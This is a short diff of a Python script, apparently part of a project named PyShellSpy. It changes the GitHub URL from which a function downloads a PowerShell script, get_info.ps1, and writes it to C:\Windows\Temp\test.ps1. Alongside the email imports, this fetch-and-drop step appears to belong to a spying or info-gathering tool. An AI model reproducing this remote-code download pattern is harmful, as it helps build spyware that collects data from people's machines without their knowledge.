@@ -9,7 +9,7 @@ from email import encoders
 
 def get_psfile():
 	#when i want to change/add new powershell script. I can renew my file that get_info.ps1 on my github. So script get another some info also..
-	file_url = urllib.request.urlopen('https://raw.githubusercontent.com/FerdiGul/Python_with_PowerShell/master/get_info.ps1')
+	file_url = urllib.request.urlopen('https://raw.githubusercontent.com/FerdiGul/PyShellSpy/master/get_info.ps1')
 	with open(r'C:\Windows\Temp\test.ps1','wb') as output:
 		output.write(file_url.read())
 
